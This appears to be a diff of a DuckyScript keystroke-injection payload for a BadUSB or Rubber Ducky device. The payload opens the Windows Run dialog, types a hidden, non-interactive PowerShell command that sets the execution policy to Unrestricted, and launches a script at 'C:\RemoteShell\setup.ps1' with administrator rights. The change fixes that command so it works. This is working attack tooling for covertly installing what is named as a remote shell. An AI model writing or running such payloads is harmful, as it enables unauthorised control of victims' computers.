@@ -12,7 +12,7 @@ ENTER
 DELAY 300
 GUI r
 DELAY 300
-STRING powershell -NoP -NonI -w h Set-ExecutionPolicy Unrestricted -and powershell -NoP -NonI -w h 'C:\RemoteShell\setup.ps1'
+STRING powershell -NoP -NonI -w h Set-ExecutionPolicy Unrestricted -and powershell -NoP -NonI -w h -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force; & 'C:\RemoteShell\setup.ps1'"
 DELAY 300
 CTRL SHIFT ENTER
 DELAY 500
